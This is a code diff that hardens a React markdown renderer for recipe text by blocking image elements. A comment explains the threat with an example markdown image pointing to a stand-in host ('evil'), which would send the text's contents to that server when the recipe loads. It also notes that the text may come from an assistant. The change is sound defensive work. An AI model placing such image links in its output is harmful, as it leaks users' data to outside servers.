@@ -51,7 +51,14 @@ function Prose({ text, className }: { text: string; className?: string }) {
     <div
       className={cn("[&>*:first-child]:mt-0 [&>*:last-child]:mb-0", className)}
     >
-      <ReactMarkdown remarkPlugins={[remarkGfm]} components={PROSE}>
+      {/* No images: recipe text can come from an assistant or a web page, and an image loads by itself, so
+          ![](https://evil/?data=…) would send whatever the text holds to that server when the recipe is opened. */}
+      <ReactMarkdown
+        remarkPlugins={[remarkGfm]}
+        components={PROSE}
+        disallowedElements={["img"]}
+        unwrapDisallowed
+      >
         {text}
       </ReactMarkdown>
     </div>
